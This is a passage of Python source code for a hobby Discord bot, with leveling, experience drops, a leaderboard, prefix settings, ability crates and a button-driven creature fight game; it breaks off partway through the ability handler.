import os
import sys
import discord
import json
import random
import asyncio
import math
import time
from discord.ext import commands

from threading import Thread

import data_functions
import resources

from flask import Flask

app = Flask(__name__)
@app.route('/')

# mining ores command?

def home():
    return "Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

Thread(target=run_web).start()

intents = discord.Intents.all()
intents.messages = True

default_prefixes = {"!"}
prefixes = {}
user_last_experience_time = {}
battle_states = {}

user_abilities = {}

shop_items = {
    "Basic Ability Crate": {
        "contents": {
            "Damage I": {"id": 1, "potency": 1, "description": "Instantly deal 150% of your normal damage amount.", "chance": 16},
            "Healing I": {"id": 2, "potency": 1, "description": "Instantly heal 40% of your max health.", "chance": 16},
            "Lifesteal I": {"id": 3, "potency": 1, "description": "Steal 25% of your enemy's current health.", "chance": 15},
            "Shield I": {"id": 4, "potency": 1, "description": "Block the next attack of your enemy.", "chance": 14},
            "Damage II": {"id": 1, "potency": 2, "description": "Instantly deal 160% of your normal damage amount.", "chance": 9},
            "Healing II": {"id": 2, "potency": 2, "description": "Instantly heal 45% of your max health.", "chance": 9},
            "Lifesteal II": {"id": 3, "potency": 2, "description": "Steal 30% of your enemy's current health.", "chance": 8},
            "Shield II": {"id": 4, "potency": 2, "description": "Block the next two attacks of your enemy.", "chance": 7},
            "Damage III": {"id": 1, "potency": 3, "description": "Instantly deal 170% of your normal damage amount.", "chance": 6}
        },
        "cost": 50
    },
    "Standard Ability Crate": {
        "contents": {
            "Damage II": {"id": 1, "potency": 2, "description": "Instantly deal 160% of your normal damage amount.", "chance": 16},
            "Healing II": {"id": 2, "potency": 2, "description": "Instantly heal 45% of your max health.", "chance": 16},
            "Lifesteal II": {"id": 3, "potency": 2, "description": "Steal 30% of your enemy's current health.", "chance": 15},
            "Shield II": {"id": 4, "potency": 2, "description": "Block the next two attacks of your enemy.", "chance": 14},
            "Damage III": {"id": 1, "potency": 3, "description": "Instantly deal 170% of your normal damage amount.", "chance": 9},
            "Healing III": {"id": 2, "potency": 3, "description": "Instantly heal 50% of your max health.", "chance": 9},
            "Lifesteal III": {"id": 3, "potency": 3, "description": "Steal 35% of your enemy's current health.", "chance": 8},
            "Shield III": {"id": 4, "potency": 3, "description": "Block the next three attacks of your enemy.", "chance": 7},
            "Damage IV": {"id": 1, "potency": 4, "description": "Instantly deal 180% of your normal damage amount.", "chance": 6}
        },
        "cost": 200
    },
    "Advanced Ability Crate": {
        "contents": {
            "Damage III": {"id": 1, "potency": 3, "description": "Instantly deal 170% of your normal damage amount.", "chance": 16},
            "Healing III": {"id": 2, "potency": 3, "description": "Instantly heal 50% of your max health.", "chance": 16},
            "Lifesteal III": {"id": 3, "potency": 3, "description": "Steal 35% of your enemy's current health.", "chance": 15},
            "Shield III": {"id": 4, "potency": 3, "description": "Block the next three attacks of your enemy.", "chance": 14},
            "Damage IV": {"id": 1, "potency": 4, "description": "Instantly deal 180% of your normal damage amount.", "chance": 9},
            "Healing IV": {"id": 2, "potency": 4, "description": "Instantly heal 55% of your max health.", "chance": 9},
            "Lifesteal IV": {"id": 3, "potency": 4, "description": "Steal 40% of your enemy's current health.", "chance": 8},
            "Shield IV": {"id": 4, "potency": 4, "description": "Block the next four attacks of your enemy.", "chance": 7},
            "Damage V": {"id": 1, "potency": 5, "description": "Instantly deal 190% of your normal damage amount.", "chance": 6}
        },
        "cost": 1000
    }
}

error_logs = []
never_have_i_ever_questions = resources.get_never_have_i_evers()
brain_teasers = resources.get_brain_teasers()
brain_teaser_answers = resources.get_brain_teaser_answers()
trivia_categories = resources.get_trivia_categories()

disabled_commands = []

bot = commands.Bot(command_prefix=lambda bot, message: data_functions.get_prefix(message.guild.id), intents=intents)

data_functions.setup_database()

@bot.event
async def on_ready():
    guild = discord.Object(id=1292978415552434196)
    try:
        synced = await bot.tree.sync()
    except Exception as e:
        pass

@bot.event
async def on_disconnect():
    print("Bot disconnected. Attempting to reconnect in 5 seconds...")
    await asyncio.sleep(5)

@bot.event
async def on_resumed():
    print("Bot reconnected!")

@bot.event
async def on_message(msg):
    if msg.author == bot.user or msg.author.bot:
        return
    
    user_id = msg.author.id
    current_time = time.time()

    if math.floor(random.random() * 100 + 1) <= 5:
        random_integer = random.randint(1, 100)
        type = "Common" if random_integer < 60 else "Rare" if random_integer < 80 else "Epic" if random_integer < 90 else "Legendary" if random_integer < 95 else "Mythical" if random_integer < 98 else "Celestial" 
        amount = random.randint(60, 150) if random_integer < 60 else random.randint(120, 250) if random_integer < 80 else random.randint(240, 380) if random_integer < 90 else random.randint(350, 520) if random_integer < 95 else random.randint(510, 800) if random_integer < 98 else random.randint(750, 1200) 
        await msg.channel.send(embed=discord.Embed(
            color=int("50B4E6", 16),
            title="Experience Drop",
            description=f"🧪 A **{type}** Experience Drop of {amount} has started! Type 'claim' to claim it before the time runs out!"
        ))
        try:
            response = await bot.wait_for('message', check=lambda msg2: msg2.channel == msg.channel and msg2.content.lower() == "claim", timeout=10.0)
            if not response.author.bot:
                await msg.channel.send(embed=discord.Embed(
                    color=int("50B4E6", 16),
                    title="Experience Drop",
                    description=f"*{response.author.name}* was the first to claim the **{type}** Experience Drop of {amount}!"
                ))
                data_functions.set_experience(response.author.id, data_functions.get_experience(response.author.id) + amount)
        except asyncio.TimeoutError:
            await msg.channel.send(embed=discord.Embed(
                color=int("FA3939", 16),
                title="Experience Drop",
                description="⏳ Nobody claimed the experience drop in time."
            ))
    
    if user_id in user_last_experience_time:
        time_diff = current_time - user_last_experience_time[user_id]
        if time_diff < 10:
            return
    
    user_last_experience_time[user_id] = current_time
    data_functions.set_messages(user_id, data_functions.get_messages(user_id) + 1)
    data_functions.set_experience(user_id, data_functions.get_experience(user_id) + math.floor(random.random() * 10 + 5))
    level = data_functions.get_levels(user_id)
    experience = data_functions.get_experience(user_id)
    if ((25 * (level**2) - (25 * level))/level + 50) - experience <= 0:
        data_functions.set_levels(user_id, data_functions.get_levels(user_id) + 1)
        data_functions.set_experience(user_id, 0)
        await msg.channel.send(embed=discord.Embed(
            color=int("50B4E6", 16),
            description=f"⬆️ Congratulations! The user *'{msg.author.name}'* has leveled up to **Level {data_functions.get_levels(user_id)}**!"
        ).set_author(name=msg.author.name, icon_url=msg.author.avatar.url))
    await bot.process_commands(msg)

@bot.event
async def on_command_error(ctx, error):
    error_logs.append(error)
    if len(error_logs) > 20:
        if error_logs and 0 in error_logs:
            del error_logs[0]

bot.remove_command("help")
@bot.command(help="Shows this help message.", aliases=["commands", "cmds"])
async def help(ctx, command_name: str = None):
    if ctx.author.bot:
        return
    if command_name is not None:
        global disabled_commands
        command = bot.get_command(command_name.lower())
        if command:
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"**{command.name}** {'(Disabled) ' if command.name in disabled_commands else ''}- {command.help}\n**Aliases:** {', '.join(command.aliases) if command.aliases else 'None'}"
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        else:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description="❌ Invalid command."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    else:
        help_text = "- " + "\n- ".join([f"**{cmd.name}** {'(Disabled) ' if cmd.name in disabled_commands else ''}- {cmd.help}\n**Aliases:** {', '.join(cmd.aliases) if cmd.aliases else 'None'}" for cmd in bot.commands])
        await ctx.send(embed=discord.Embed(
            color=int("50B4E6", 16),
            description=f"{help_text}"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(aliases=["dis"], help="Disable a specific command.")
async def disable(ctx, cmd_name):
    if ctx.author.bot:
        return
    if ctx.author.id != 1089171899294167122:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ Please ask **hanyangzhou** to disable commands."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    global disabled_commands
    command = bot.get_command(cmd_name.lower())
    if command:
        await ctx.send(embed=discord.Embed(
            color=int("50B4E6", 16),
            description=f"✅ Succesfully disabled the command '{command.name}'."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        disabled_commands.append(command.name)
    else:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ Invalid command."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(aliases=["en"], help="Enable a specific command.")
async def enable(ctx, cmd_name):
    if ctx.author.bot:
        return
    if ctx.author.id != 1089171899294167122:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ Please ask **hanyangzhou** to enable commands."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    global disabled_commands
    command = bot.get_command(cmd_name.lower())
    if command:
        if command.name in disabled_commands:
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"✅ Succesfully enabled the command '{command.name}'."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
            disabled_commands.remove(command.name)
        else:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ The command '{command.name}' is not currently disabled."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    else:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ Invalid command."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(aliases=["lb"], help="Shows the server leaderboard.")
async def leaderboard(ctx):
    if ctx.author.bot:
        return
    global disabled_commands
    if "leaderboard" in disabled_commands:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    user_levels = data_functions.get_all_user_levels()

    if not user_levels:
        await ctx.send("❌ Nobody is on the leaderboard!")
        return

    user_data = {await bot.fetch_user(user_id): level for user_id, level in user_levels.items()}

    sorted_users = sorted(user_data.items(), key=lambda x: (-x[1], x[0].name.lower()))

    embed = discord.Embed(
        title="🏆 Leaderboard",
        color=int("50B4E6", 16),
        description=""
    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)

    for index, (user, level) in enumerate(sorted_users[:10], start=1):
        embed.description += f"**{index}. {user.name}** - Level {level}\n"
    await ctx.send(embed=embed)

@bot.command(aliases=["reset_lb", "r_lb"], help="Resets the server leaderboard.")
async def reset_leaderboard(ctx):
    if ctx.author.bot:
        return
    global disabled_commands
    if "reset_leaderboard" in disabled_commands:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    if not ctx.author.guild_permissions.manage_guild:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ You do not have permission to use this command.\n**Missing permissions:** *Manage Server*"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    await ctx.send(embed=discord.Embed(
        color=int("50B4E6", 16),
        description="✅ Successfully reset the leaderboard!"
    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    data_functions.reset_data()

@bot.command(aliases=["vp", "viewp"], help="Shows the current prefix of this bot.")
async def view_prefix(ctx):
    if ctx.author.bot:
        return
    global disabled_commands
    if "view_prefix" in disabled_commands:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    await ctx.send(embed=discord.Embed(
        color=int("50B4E6", 16),
        description=f"The current prefix is '{data_functions.get_prefix(ctx.guild.id)}'."
    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    

@bot.command(aliases=["sp", "setp"], help="Changes the prefix of this bot.")
async def set_prefix(ctx, new_prefix: str = None):
    if ctx.author.bot:
        return
    if ctx.author.guild_permissions.manage_guild:
        global disabled_commands
        if "set_prefix" in disabled_commands:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
            return
        if new_prefix is not None:
            if len(new_prefix) > 32:
                await ctx.send(embed=discord.Embed(
                    color=int("50B4E6", 16),
                    description="❌ The prefix chosen is too long. Please try again with a shorter prefix."
                ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                return
            data_functions.set_prefix(ctx.guild.id, new_prefix)
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"✅ The prefix has successfully been changed to '{new_prefix}'."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    else:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ You do not have permission to use this command.\n**Missing permissions:** *Manage Server*"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.tree.command(name="view-prefix", description="Shows the current prefix of this bot.")
async def slash_view_prefix(interaction: discord.Interaction):
    global disabled_commands
    if "view_prefix" in disabled_commands:
        await interaction.response.send_message(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=interaction.user.name, icon_url=interaction.user.avatar.url))
        return
    await interaction.response.send_message(embed=discord.Embed(
        color=int("50B4E6", 16),
        description=f"The current prefix is '{data_functions.get_prefix(interaction.guild.id)}'."
    ).set_author(name=interaction.user.name, icon_url=interaction.user.avatar.url))

@bot.command(aliases=["vs", "msgs", "lvls", "stats"], help="Shows the statistics of a user.")
async def view_stats(ctx, name: str = None):
    if ctx.author.bot:
        return
    if not ctx.author.bot:
        global disabled_commands
        if "view_stats" in disabled_commands:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
            return
        user = None
        if name is None:
            user = ctx.author
        else:
            matching_names = []
            for member in ctx.guild.members:
                if name.lower() in member.name.lower() and not member.bot:
                    matching_names.append(member.name)
            if matching_names:
                if len(matching_names) > 1:
                    msg = ""
                    for i, n in enumerate(matching_names):
                        msg += str(i + 1) + ". " + n
                        if i != len(matching_names) - 1:
                            msg += "\n"
                    try:
                        await ctx.send(embed=discord.Embed(
                            color=int("50B4E6", 16),
                            description=f"Mutiple users found. Please select a user below, or type cancel:\n{msg}"
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    
                        selection = None
                        response = await bot.wait_for('message', check=lambda msg: msg.channel == ctx.channel and msg.author == ctx.author, timeout=15.0)
    
                        if "cancel" in response.content.lower():
                            await ctx.send(embed=discord.Embed(
                                color=int("FA3939", 16),
                                description="❌ The command has been canceled."
                            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                            return
                        try:
                            selection = int(response.content)
                        except ValueError:
                            await ctx.send(embed=discord.Embed(
                                color=int("FA3939", 16),
                                description="❌ Invalid selection."
                            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                            return
                        else:
                            if selection is not None:
                                if (selection - 1) >= 0 and (selection - 1) <= (len(matching_names) - 1):
                                    matching_name = matching_names[selection - 1]
                                    for member in ctx.guild.members:
                                        if member.name.lower() == matching_name.lower():
                                            user = member
                                            break
                                else:
                                    await ctx.send(embed=discord.Embed(
                                        color=int("FA3939", 16),
                                        description="❌ Invalid selection."
                                    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                                    return
                    except asyncio.TimeoutError:
                        await ctx.send(embed=discord.Embed(
                            color=int("FA3939", 16),
                            description="⏳ The command has been canceled because you took too long to reply."
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                        return
                else:
                    for member in ctx.guild.members:
                        if member.name.lower() == matching_names[0].lower():
                            user = member
                            break
        if user is not None:
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"**Attempting to retrieve data for {user.name}...**"
            ).set_author(name=user.name, icon_url=user.avatar.url))
    
            messages = data_functions.get_messages(user.id)
            level = data_functions.get_levels(user.id)
            experience = data_functions.get_experience(user.id)
            experience_left = (25*(level**2)-(25*level)+100) - experience
    
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                title="User Statistics",
                description=f"**Level:** {level}\n**Experience:** {experience}\n**Until Next Level:** {experience_left}\n**Messages:** {messages}\n**Server Join Date:** {user.joined_at.strftime('%m/%d/%Y').lstrip('0').replace('/0', '/')}\n**Role:** {user.top_role}\n**Identification Number:** {user.id}"
            ).set_author(name=user.name, icon_url=user.avatar.url))

@bot.command(aliases=["expdrop", "expd", "ed"], help="Create an experience drop in a channel.")
async def experience_drop(ctx):
    if ctx.author.bot:
        return
    if ctx.author.guild_permissions.manage_guild:
        global disabled_commands
        if "experience_drop" in disabled_commands:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
            return
        random_integer = random.randint(1, 100)
        type = "Common" if random_integer < 60 else "Rare" if random_integer < 80 else "Epic" if random_integer < 90 else "Legendary" if random_integer < 95 else "Mythical" if random_integer < 98 else "Celestial" 
        amount = random.randint(160, 240) if random_integer < 60 else random.randint(240, 320) if random_integer < 80 else random.randint(320, 650) if random_integer < 90 else random.randint(650, 920) if random_integer < 95 else random.randint(920, 1200) if random_integer < 98 else random.randint(1200, 1500) 
        await ctx.send(embed=discord.Embed(
            color=int("50B4E6", 16),
            title="Experience Drop",
            description=f"🧪 A **{type}** Experience Drop of {amount} has started! Type 'claim' to claim it before the time runs out!"
        ))
        try:
            response = await bot.wait_for('message', check=lambda msg: msg.channel == ctx.channel and msg.content.lower() == "claim", timeout=15.0)
            if not response.author.bot:
                await ctx.send(embed=discord.Embed(
                    color=int("50B4E6", 16),
                    title="Experience Drop",
                    description=f"*{response.author.name}* was the first to claim the **{type}** Experience Drop of {amount}!"
                ))
                data_functions.set_experience(response.author.id, data_functions.get_experience(response.author.id) + amount)
        except asyncio.TimeoutError:
            await msg.channel.send(embed=discord.Embed(
                color=int("FA3939", 16),
                title="Experience Drop",
                description="⏳ Nobody claimed the experience drop in time."
            ))
    else:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ You do not have permission to use this command.\n**Missing permissions:** *Manage Server*"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.tree.command(name="fight", description="Fight against a creature for rewards!")
async def slash_fight(interaction: discord.Interaction):
    global battle_states
    global user_abilities
    global disabled_commands
    if "fight" in disabled_commands:
        await interaction.response.send_message(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=interaction.user.name, icon_url=interaction.user.avatar.url))
        return
    elif interaction.user.id in battle_states:
        await interaction.response.send_message(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ You are already in a battle!"
        ).set_author(name=interaction.user.name, icon_url=interaction.user.avatar.url), ephemeral=True)
        return

    random_integer = random.randint(1, 100)
    difficulty = random.randint(1, 10)
    creature_type = random.choice(["Zombie", "Goblin", "Elf", "Angel", "Demon", "Warrior", "Knight", "Slime"])

    sizes = {
        "Big": round(random.uniform(1.5, 2.5), 2),
        "Large": round(random.uniform(2.5, 4), 2),
        "Huge": round(random.uniform(4, 5.5), 2),
        "Giant": round(random.uniform(5.5, 8), 2),
        "Colossal": round(random.uniform(8, 11.5), 2)
    }

    mutations = {
        "Possessed": round(random.uniform(2, 3.5), 2),
        "Phantom": round(random.uniform(4, 6.5), 2),
        "Ancient": round(random.uniform(5, 8), 2),
        "Ethereal": round(random.uniform(6, 9), 2),
        "Heavenly": round(random.uniform(4.5, 10), 2),
        "Galactic": round(random.uniform(6, 11.5), 2),
        "Divine": round(random.uniform(8, 12), 2),
        "Superior": round(random.uniform(3, 5), 2),
        "Exotic": round(random.uniform(10, 13.5), 2)
    }

    creature_level = (
        random.randint(1, 3) if random_integer < 50 else
        random.randint(3, 15) if random_integer < 70 else
        random.randint(15, 35) if random_integer < 85 else
        random.randint(35, 60) if random_integer < 95 else
        random.randint(60, 95) if random_integer < 98 else
        random.randint(95, 140)
    )

    user_level = data_functions.get_levels(interaction.user.id)
    mutation_multiplier = 1
    size_multiplier = 1

    mutation = random.choice(list(mutations.keys())) if random.randint(1, 3) == 1 else ""
    if mutation:
        mutation_multiplier = mutations[mutation]
        creature_level = math.ceil(creature_level * 1.5)

    size = random.choice(list(sizes.keys())) if random.randint(1, 3) == 1 else ""
    if size:
        size_multiplier = sizes[size]
        creature_level = math.ceil(creature_level * 1.5)

    reward = math.floor(random.randint(5, 20) * creature_level * size_multiplier * mutation_multiplier)
    risk = math.ceil(reward / 5)

    level_difference = creature_level - user_level
    user_health = 100 + math.floor(abs(5 * (user_level - 1)))
    enemy_health = 100 + math.floor(abs(5 * (creature_level - 1) * size_multiplier * mutation_multiplier))
    critical_chance = 35

    if level_difference > 0:
        critical_chance = math.floor(critical_chance - (5 * math.log1p(abs(level_difference))) - level_difference)
    else:
        critical_chance = math.floor(critical_chance + (5 * math.log1p(abs(level_difference))) + level_difference)

    critical_chance = max(5, min(95, critical_chance))

    battle_states[interaction.user.id] = {
        "turn": "user",
        "user_max_health": user_health,
        "enemy_max_health": enemy_health,
        "user_health": user_health,
        "enemy_health": enemy_health,
        "critical_chance": critical_chance,
        "creature": f"{' ' + size if size else ''}{' ' + mutation if mutation else ''} {creature_type}",
        "multipliers": size_multiplier * mutation_multiplier,
        "reward": reward,
        "risk": risk,
        "ability_used": False,
        "tags": [],
        "blocks": 0
    }

    encounter_message = (
        f"⚔️ You encountered a **{' ' + size if size else ''}{' ' + mutation if mutation else ''} {creature_type} (Level {creature_level})** in the wild.\n\n"
        f"Your Health: {user_health} | Creature Health: {enemy_health} | Difficulty: {difficulty}/10 | Risk: {risk}"
    )

    view = discord.ui.View()

    async def attack_callback(attack_interaction: discord.Interaction):
        if attack_interaction.user.id not in battle_states:
            await attack_interaction.response.send_message(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This battle does not exist anymore!"
            ).set_author(name=attack_interaction.user.name, icon_url=attack_interaction.user.avatar.url), ephemeral=True)
            return
        elif attack_interaction.user.id != interaction.user.id:
            await attack_interaction.response.send_message(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This is not your battle!"
            ).set_author(name=attack_interaction.user.name, icon_url=attack_interaction.user.avatar.url), ephemeral=True)
            return

        shielded = False
        
        state = battle_states[attack_interaction.user.id]
        critical_hit = (random.randint(1, 100) <= state["critical_chance"])

        damage = math.ceil(random.randint(8, 15) * math.ceil(user_level / 2) + 2) if critical_hit else (random.randint(2, 8) * math.ceil(user_level / 2) + 1)
        state["enemy_health"] = max(0, state["enemy_health"] - damage)

        enemy_damage = math.ceil(random.randint(2, 7) * (math.ceil(creature_level / 2) + 2) * state["multipliers"])

        if state["blocks"] > 0:
            state["blocks"] = max(0, state["blocks"] - 1)
            shielded = True
            await attack_interaction.response.edit_message(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"🛡️ You dealt **{damage} {'critical ' if critical_hit else ''}damage** to the {state['creature']} and your shield blocked it from attacking back!{(' Remaining shields: ' + str(state['blocks'])) if state['blocks'] > 0 else ''}\n\nYour Health: {state['user_health']}\nEnemy Health: {state['enemy_health']}"
            ).set_author(name=attack_interaction.user.name, icon_url=attack_interaction.user.avatar.url))

        if state["enemy_health"] <= 0 or (state["user_health"] - enemy_damage <= 0):
            if state["user_health"] - enemy_damage <= 0 and not shielded:
                state["user_health"] = max(0, state["user_health"] - enemy_damage)
            await attack_interaction.response.edit_message(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"🏆 You dealt **{damage} {'critical ' if critical_hit else ''}damage** to the {state['creature']} and defeated it!\n\n*+{state['reward']} Experience*\n*+{math.ceil(state['reward'] / 9) + 1} Coins*\n\nYour Health: {state['user_health']}\nEnemy Health: {state['enemy_health']}" if state["enemy_health"] <= 0 else f"🪦 The {state['creature']} dealt **{enemy_damage} damage** and defeated you!\n\n*-{state['risk']} Experience*\n\nYour Health: {state['user_health']}\nEnemy Health: {state['enemy_health']}"
            ).set_author(name=attack_interaction.user.name, icon_url=attack_interaction.user.avatar.url), view=None)
            del battle_states[attack_interaction.user.id]
            user_experience = data_functions.get_experience(interaction.user.id)
            user_coins = data_functions.get_coins(interaction.user.id)
            if state["enemy_health"] <= 0:
                data_functions.set_coins(interaction.user.id, user_coins + math.ceil(state["reward"] / 9) + 1)
                data_functions.set_experience(interaction.user.id, user_experience + state["reward"])
            else:
                data_functions.set_experience(interaction.user.id, max(user_experience - state["risk"], 0))
        else:
            state["user_health"] = max(0, state["user_health"] - enemy_damage)
            await attack_interaction.response.edit_message(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"💥 You dealt **{damage} {'critical ' if critical_hit else ''}damage** to the {state['creature']} and it attacked back, dealing **{enemy_damage} damage** to you.\n"
                            f"\n\nYour Health: {state['user_health']}\nEnemy Health: {state['enemy_health']}"
            ).set_author(name=attack_interaction.user.name, icon_url=attack_interaction.user.avatar.url))

    async def escape_callback(escape_interaction: discord.Interaction):
        if escape_interaction.user.id not in battle_states:
            await escape_interaction.response.send_message(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This battle does not exist anymore!"
            ).set_author(name=escape_interaction.user.name, icon_url=escape_interaction.user.avatar.url), ephemeral=True)
            return
        elif escape_interaction.user.id != interaction.user.id:
            await escape_interaction.response.send_message(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This is not your battle!"
            ).set_author(name=escape_interaction.user.name, icon_url=escape_interaction.user.avatar.url), ephemeral=True)
            return

        del battle_states[escape_interaction.user.id]
        await escape_interaction.response.edit_message(embed=discord.Embed(
            color=int("50B4E6", 16),
            description="🏃 You successfully escaped the battle!"
        ), view=None)

    async def ability_callback(ability_interaction: discord.Interaction):
        if ability_interaction.user.id not in battle_states:
            await ability_interaction.response.send_message(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This battle does not exist anymore!"
            ).set_author(name=ability_interaction.user.name, icon_url=ability_interaction.user.avatar.url), ephemeral=True)
            return
        elif ability_interaction.user.id != interaction.user.id:
            await ability_interaction.response.send_message(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This is not your battle!"
            ).set_author(name=ability_interaction.user.name, icon_url=ability_interaction.user.avatar.url), ephemeral=True)
            return
        elif ability_interaction.user.id not in user_abilities:
            await ability_interaction.response.send_message(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ You do not have an ability!"
            ).set_author(name=ability_interaction.user.name, icon_url=ability_interaction.user.avatar.url), ephemeral=True)
            return

        state = battle_states[ability_interaction.user.id]
        
        creature = state["creature"]

        if not state["ability_used"]:
            failed = (random.randint(1, 3) == 1)
            if not failed:
                ability_name = user_abilities[ability_interaction.user.id]
                ability = None
                for crate in shop_items.values():
                    if ability_name in crate["contents"]:
                        ability = crate["contents"][ability_name]
                        break
                if ability is None:
                    return
                if ability["id"] == 1:
                    critical_hit = (random.randint(1, 100) <= state["critical_chance"])
                    damage = math.ceil(random.randint(5, 10) * math.ceil(user_level/2) + 2) if critical_hit else (random.randint(2, 5) * math.ceil(user_level/2) + 1) * ((150 + (10 * ability["potency"])) / 100)
                    
                    state["enemy_health"] = max(0, state["enemy_health"] - damage)
                    await ability_interaction.response.edit_message(embed=discord.Embed(
                        color=int("50B4E6", 16),
                        description=f"⚔️ You used your ability ({ability_name}), dealing **{damage} {'critical ' if critical_hit else ''}damage** to the {creature}.\n\nYour Health: {state['user_health']}\nEnemy Health: {state['enemy_health']}"
                    ).set_author(name=ability_interaction.user.name, icon_url=ability_interaction.user.avatar.url))
                elif ability["id"] == 2:
                    heal = math.ceil(state["user_max_health"] * (40 + (ability["potency"] * 5)) / 100)
                    state["user_health"] += heal
                    await ability_interaction.response.edit_message(embed=discord.Embed(
                        color=int("50B4E6", 16),
                        description=f"🩹 You used your ability ({ability_name}), healing **{heal} health**.\n\nYour Health: {state['user_health']}\nEnemy Health: {state['enemy_health']}"
                    ).set_author(name=ability_interaction.user.name, icon_url=ability_interaction.user.avatar.url))
                elif ability["id"] == 3:
                    steal = math.ceil(state["enemy_max_health"] * (25 + (ability["potency"] * 5)) / 100)
                    state["enemy_health"] = max(0, state["enemy_health"] - steal)
                    state["user_health"] += steal
                    await ability_interaction.response.edit_message(embed=discord.Embed(
                        color=int("50B4E6", 16),
                        description=f"🧪 You used your ability ({ability_name}), stealing **{steal} health** from the {creature}.\n\nYour Health: {state['user_health']}\nEnemy Health: {state['enemy_health']}"
                    ).set_author(name=ability_interaction.user.name, icon_url=ability_interaction.user.avatar.url))
                elif ability["id"] == 4:
                    shield = 1 + (ability["potency"] - 1)
                    state["blocks"] += shield
                    await ability_interaction.response.edit_message(embed=discord.Embed(
                        color=int("50B4E6", 16),
                        description=f"🛡️ You used your ability ({ability_name}), blocking the {creature} from attacking for the next {shield} turns.\n\nYour Health: {state['user_health']}\nEnemy Health: {state['enemy_health']}"
                    ).set_author(name=ability_interaction.user.name, icon_url=ability_interaction.user.avatar.url))
            else:
                await ability_interaction.response.edit_message(embed=discord.Embed(
                    color=int("FA3939", 16),
                    description=f"❌ You used your ability, but it failed!\n\nYour Health: {state['user_health']}\nEnemy Health: {state['enemy_health']}"
                ).set_author(name=ability_interaction.user.name, icon_url=ability_interaction.user.avatar.url))
            state["ability_used"] = True
        else:
